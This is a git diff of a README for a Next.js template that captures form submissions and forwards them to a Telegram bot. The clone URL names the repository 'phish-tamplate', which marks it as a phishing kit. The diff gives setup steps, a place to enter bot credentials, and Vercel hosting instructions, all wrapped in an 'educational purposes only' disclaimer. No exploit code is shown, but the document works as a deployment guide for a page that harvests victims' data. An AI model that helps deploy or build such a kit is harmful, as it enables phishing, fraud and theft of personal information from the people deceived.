@@ -1,4 +1,4 @@
-# Next.js Telegram Data Collection Template
+# Collect Form Data From Next.js Web Application
 
 **DISCLAIMER: This project is created for EDUCATIONAL PURPOSES ONLY. The author does not endorse or encourage any malicious use of this code. Use responsibly and ethically.**
 
@@ -18,7 +18,7 @@ This template demonstrates how to collect form data and send it to a Telegram bo
 
 ## Configuration
 
-All Telegram bot settings are centralized in `app/assets/assets.js`:
+Add your telegram bot details in `app/assets/assets.js`:
 
 ```js
 export const tgBotData = {
@@ -29,13 +29,30 @@ export const tgBotData = {
 
 Simply replace these values with your own Telegram bot credentials to receive data.
 
-## Getting Started
+## Deployment on Vercel (Recommended)
+
+The easiest way to deploy this project is using Vercel:
+
+1. **Create a Vercel Account**: Sign up at [vercel.com](https://vercel.com) if you don't have an account
+
+2. **Connect Your GitHub Repository**:
+   - Fork this template to your GitHub account
+   - In Vercel dashboard, click "New Project"
+   - Select your repository from the list
+   - Vercel will detect Next.js automatically
+
+3. **Configure Project**:
+   - Keep the default settings
+   - Add any environment variables if needed
+   - Click "Deploy"
+
+Your project will be live at `https://your-project-name.vercel.app`
 
 First, clone the repository:
 
 ```bash
-git clone https://github.com/yourusername/your-repo-name.git
-cd your-repo-name
+git clone https://github.com/asrbd-army/phish-tamplate.git
+cd phish-tamplate
 ```
 
 Install dependencies:
@@ -55,30 +72,6 @@ yarn dev
 ```
 
 Open [http://localhost:3000](http://localhost:3000) to see the result.
-
-## Deployment on Vercel
-
-The easiest way to deploy this project is using Vercel:
-
-1. **Create a Vercel Account**: Sign up at [vercel.com](https://vercel.com) if you don't have an account
-
-2. **Connect Your GitHub Repository**:
-   - Fork this template to your GitHub account
-   - In Vercel dashboard, click "New Project"
-   - Select your repository from the list
-   - Vercel will detect Next.js automatically
-
-3. **Configure Project**:
-   - Keep the default settings
-   - Add any environment variables if needed
-   - Click "Deploy"
-
-4. **After Deployment**:
-   - Update the `tgBotData` in `app/assets/assets.js` with your Telegram bot credentials
-   - Commit and push the changes
-   - Vercel will automatically redeploy
-
-Your project will be live at `https://your-project-name.vercel.app`
 
 ## How It Works
 
@@ -111,3 +104,6 @@ This project is shared for educational purposes only. By using this code, you ag
 ## Disclaimer
 
 THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED. The author takes no responsibility for any misuse of this software. This project should be used only for learning and understanding web technologies in an ethical manner.
+
+## Credit
+- [ASRBD](https://asrbd.pages.dev)
